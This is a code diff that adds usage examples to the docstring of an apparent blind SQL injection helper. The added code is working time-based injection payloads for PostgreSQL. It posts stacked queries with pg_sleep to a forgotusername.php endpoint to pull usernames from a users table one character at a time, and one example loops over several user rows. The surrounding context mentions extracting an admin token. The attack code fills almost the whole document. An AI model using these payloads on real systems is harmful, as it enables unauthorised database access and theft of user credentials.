@@ -31,11 +31,43 @@ Example - time-based blind SQLi on PostgreSQL:
 
     secret = extract_string_blind(is_correct_char, length=32, label="admin token")
     print(secret)
-"""
 
+    OR..
+    def stage1_sqli(base_url: str) -> None:
+        def is_correct_char_username(index: int, char: str) -> bool:
+            payload = f\"\"\"admin'; SELECT CASE WHEN (substr((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1) = $${char}$$) THEN pg_sleep(3) ELSE pg_sleep(0) END; --\"\"\"
+            start = time.time()
+            session.post(f"{base_url}/forgotusername.php", data={"username": payload})
+            return time.time() - start >= 3
+        secret = extract_string_blind(is_correct_char_username, length=32, label="username")
+        
+
+    OR with offset...
+    def stage1_sqli(base_url: str) -> None:
+        def is_correct_char_with_offset(index: int, char: str, user_offset: int = 0) -> bool:
+            # Use OFFSET {user_offset} to skip rows
+            # Offset 0 = 1st user, Offset 1 = 2nd user, etc.
+            payload = (
+                "admin'; (SELECT CASE WHEN ("
+                f"substr((SELECT username FROM users LIMIT 1 OFFSET {user_offset}), {index}, 1) = $${char}$$"
+                ") THEN pg_sleep(3) ELSE pg_sleep(0) END); --"
+            )
+            start = time.time()
+            session.post(f"{base_url}/forgotusername.php", data={"username": payload})
+            return time.time() - start >= 3.0
+        
+        for offset in range(5):
+            print(f"Extracting username for user at offset {offset}...")
+            # Use a lambda to pass the offset to your check function
+            user = extract_string_blind(lambda idx, c: is_correct_char_with_offset(idx, c, offset), length=10)
+            print(f"Found username: {user}")
+
+
+
+
+"""
 import concurrent.futures
 import string
-import sys
 import time
 
 # ==============================================================================
